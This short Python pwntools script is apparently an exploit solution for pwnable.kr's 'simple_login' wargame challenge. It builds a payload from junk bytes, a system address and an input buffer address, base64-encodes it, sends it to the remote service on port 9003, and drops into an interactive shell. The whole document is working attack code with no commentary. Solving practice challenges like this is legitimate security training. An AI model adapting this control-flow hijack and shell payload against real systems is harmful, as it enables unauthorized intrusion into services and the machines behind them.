from pwn import *
import base64
debug = False
if debug:
	p = process("./simple_login")
else:
	p = remote("pwnable.kr", 9003)
system_addr = 0x08049284
input_addr = 0x0811EB40
payload = "junk" + p32(system_addr) + p32(input_addr)
p.sendline(base64.b64encode(payload))
p.interactive()
